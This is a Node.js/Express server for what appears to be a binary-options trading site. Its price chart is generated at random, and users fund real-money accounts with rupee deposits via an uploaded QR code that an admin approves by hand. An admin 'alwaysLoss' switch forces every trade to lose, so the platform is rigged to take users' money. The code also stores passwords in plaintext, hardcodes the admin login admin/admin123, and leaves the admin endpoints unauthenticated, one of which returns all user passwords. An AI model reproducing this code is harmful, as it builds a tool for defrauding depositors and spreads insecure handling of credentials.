const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const fs = require('fs').promises;
const multer = require('multer');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '../public')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '../views'));

// Memory storage for Vercel (since file system is read-only)
let users = {};
let trades = [];
let depositRequests = [];
let qrCode = null;
let maintenanceMode = 'off';
let alwaysLoss = 'off';

// Multer for file uploads (in-memory for Vercel)
const storage = multer.memoryStorage();
const upload = multer({ storage });

// Helper functions
const generatePrice = () => Math.random() * (85000 - 82000) + 82000;
const generateCandle = (lastPrice) => {
  const change = (Math.random() - 0.5) * 1000;
  const open = lastPrice || generatePrice();
  const close = open + change;
  const high = Math.max(open, close) + Math.random() * 200;
  const low = Math.min(open, close) - Math.random() * 200;
  return { open, high, low, close, time: Date.now() };
};

// Socket.io for real-time data
let currentPrice = generatePrice();
let candleData = [];

const sendPriceUpdate = () => {
  const candle = generateCandle(currentPrice);
  currentPrice = candle.close;
  candleData.push(candle);
  if (candleData.length > 100) candleData.shift();
  
  io.emit('priceUpdate', {
    price: currentPrice,
    candle: candle,
    candleData: candleData
  });
};

// Start price updates
setInterval(sendPriceUpdate, 1000);

io.on('connection', (socket) => {
  console.log('User connected:', socket.id);
  
  // Send initial data
  socket.emit('priceUpdate', {
    price: currentPrice,
    candleData: candleData
  });
  
  socket.on('disconnect', () => {
    console.log('User disconnected:', socket.id);
  });
});

// Routes
app.get('/', (req, res) => {
  res.render('index');
});

app.get('/login', (req, res) => {
  res.render('login');
});

app.get('/register', (req, res) => {
  res.render('register');
});

app.get('/admin', (req, res) => {
  res.render('admin');
});

// API Routes
app.post('/api/register', (req, res) => {
  const { username, password } = req.body;
  const userId = uuidv4();
  
  users[userId] = {
    id: userId,
    username,
    password,
    demoBalance: 10000,
    realBalance: 0,
    currentAccount: 'demo'
  };
  
  res.json({ success: true, userId, message: 'Registration successful' });
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const user = Object.values(users).find(u => u.username === username && u.password === password);
  
  if (user) {
    res.json({ success: true, userId: user.id, message: 'Login successful' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

app.get('/api/balance/:userId', (req, res) => {
  const { userId } = req.params;
  const user = users[userId];
  
  if (user) {
    res.json({
      success: true,
      demoBalance: user.demoBalance,
      realBalance: user.realBalance,
      currentAccount: user.currentAccount
    });
  } else {
    res.status(404).json({ success: false, message: 'User not found' });
  }
});

app.post('/api/trade', (req, res) => {
  try {
    const { userId, amount, direction, accountType = 'demo' } = req.body;
    const user = users[userId];
    
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }

    const tradeAmount = parseFloat(amount);
    const currentBalance = accountType === 'demo' ? user.demoBalance : user.realBalance;
    
    if (tradeAmount > currentBalance) {
      return res.status(400).json({ success: false, message: 'Insufficient balance' });
    }

    // Deduct amount
    if (accountType === 'demo') {
      user.demoBalance -= tradeAmount;
    } else {
      user.realBalance -= tradeAmount;
    }

    const trade = {
      id: uuidv4(),
      userId,
      amount: tradeAmount,
      direction,
      accountType,
      entryPrice: currentPrice,
      timestamp: new Date().toISOString(),
      status: 'active'
    };

    trades.push(trade);

    // Auto-resolve trade after 30 seconds
    setTimeout(() => {
      const finalPrice = currentPrice;
      const priceChange = finalPrice - trade.entryPrice;
      const isWin = (direction === 'up' && priceChange > 0) || (direction === 'down' && priceChange < 0);
      
      // Apply always loss mode
      const actualWin = alwaysLoss === 'on' ? false : isWin;
      
      trade.status = actualWin ? 'won' : 'lost';
      trade.exitPrice = finalPrice;
      trade.payout = actualWin ? tradeAmount * 1.8 : 0;
      
      if (actualWin) {
        if (accountType === 'demo') {
          user.demoBalance += trade.payout;
        } else {
          user.realBalance += trade.payout;
        }
      }
      
      io.emit('tradeResult', trade);
    }, 30000);

    res.json({ success: true, trade, message: 'Trade placed successfully' });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === 'admin' && password === 'admin123') {
    res.json({ success: true, message: 'Login successful' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

app.post('/api/admin/deposit', (req, res) => {
  try {
    const { userId, amount, accountType = 'real' } = req.body;
    const user = users[userId];
    
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }
    
    const depositAmount = parseFloat(amount);
    if (accountType === 'demo') {
      user.demoBalance += depositAmount;
    } else {
      user.realBalance += depositAmount;
    }
    
    res.json({ success: true, message: `Deposited ₹${depositAmount} to ${accountType} account` });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post('/api/balance/:userId/update', (req, res) => {
  try {
    const { userId } = req.params;
    const { currentAccount } = req.body;
    const user = users[userId];
    
    if (user && currentAccount) {
      user.currentAccount = currentAccount;
    }
    
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.get('/api/trades/:userId', (req, res) => {
  try {
    const { userId } = req.params;
    const userTrades = trades.filter(t => t.userId === userId);
    res.json({ success: true, trades: userTrades });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// QR Code APIs
app.get('/api/qr-code', (req, res) => {
  res.json({ success: true, qrCode });
});

app.get('/api/admin/qr-code', (req, res) => {
  res.json({ success: true, qrCode });
});

app.post('/api/admin/upload-qr', upload.single('qrCode'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ success: false, message: 'No file uploaded' });
    }

    // Convert buffer to base64 for storage
    const base64Image = `data:${req.file.mimetype};base64,${req.file.buffer.toString('base64')}`;
    qrCode = base64Image;
    
    res.json({ success: true, message: 'QR code uploaded successfully', qrCode });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Deposit Request APIs
app.post('/api/deposit-request', (req, res) => {
  try {
    const { userId, amount, utr } = req.body;
    
    if (!userId || !amount || !utr) {
      return res.status(400).json({ success: false, message: 'Missing required fields' });
    }

    const depositAmount = parseFloat(amount);
    if (isNaN(depositAmount) || depositAmount <= 0) {
      return res.status(400).json({ success: false, message: 'Invalid amount' });
    }

    const depositRequest = {
      id: uuidv4(),
      userId: String(userId),
      amount: depositAmount,
      utr: utr.trim(),
      status: 'pending',
      timestamp: new Date().toISOString()
    };

    depositRequests.push(depositRequest);
    
    res.json({ 
      success: true, 
      message: `Deposit request for ₹${depositAmount} submitted successfully. UTR: ${utr}` 
    });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.get('/api/admin/deposit-requests', (req, res) => {
  try {
    const sortedRequests = [...depositRequests].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    res.json({ success: true, requests: sortedRequests });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post('/api/admin/deposit-requests/:id/approve', (req, res) => {
  try {
    const { id } = req.params;
    const request = depositRequests.find(r => r.id === id);
    
    if (!request) {
      return res.status(404).json({ success: false, message: 'Deposit request not found' });
    }
    
    if (request.status !== 'pending') {
      return res.status(400).json({ success: false, message: 'Request already processed' });
    }
    
    const user = users[request.userId];
    if (user) {
      user.realBalance += request.amount;
    }
    
    request.status = 'approved';
    request.approvedAt = new Date().toISOString();
    
    res.json({ 
      success: true, 
      message: `Deposit approved! ₹${request.amount} added to ${request.userId}'s account` 
    });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post('/api/admin/deposit-requests/:id/reject', (req, res) => {
  try {
    const { id } = req.params;
    const request = depositRequests.find(r => r.id === id);
    
    if (!request) {
      return res.status(404).json({ success: false, message: 'Deposit request not found' });
    }
    
    request.status = 'rejected';
    request.rejectedAt = new Date().toISOString();
    
    res.json({ success: true, message: 'Deposit request rejected' });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Maintenance mode APIs
app.get('/api/admin/maintenance', (req, res) => {
  res.json({ success: true, maintenanceMode });
});

app.post('/api/admin/maintenance', (req, res) => {
  try {
    const { maintenanceMode: mode } = req.body;
    if (!['on', 'off'].includes(mode)) {
      return res.status(400).json({ success: false, message: 'Invalid maintenance mode value' });
    }
    
    maintenanceMode = mode;
    res.json({ success: true, message: `Maintenance mode set to ${mode}` });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Always Loss Mode APIs
app.get('/api/admin/always-loss', (req, res) => {
  res.json({ success: true, alwaysLoss });
});

app.post('/api/admin/always-loss', (req, res) => {
  try {
    const { alwaysLoss: mode } = req.body;
    if (!['on', 'off'].includes(mode)) {
      return res.status(400).json({ success: false, message: 'Invalid always loss mode value' });
    }
    
    alwaysLoss = mode;
    res.json({ success: true, message: `Always loss mode set to ${mode}` });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Admin stats
app.get('/api/admin/stats', (req, res) => {
  res.json({
    success: true,
    stats: {
      totalUsers: Object.keys(users).length,
      onlineUsers: 0,
      activeTrades: trades.filter(t => t.status === 'active').length,
      totalVolume: trades.reduce((sum, t) => sum + t.amount, 0),
      serverRevenue: 0,
      winRate: 50
    }
  });
});

app.get('/api/admin/users', (req, res) => {
  res.json({ success: true, users: Object.values(users), onlineUsers: {} });
});

// For Vercel
module.exports = app;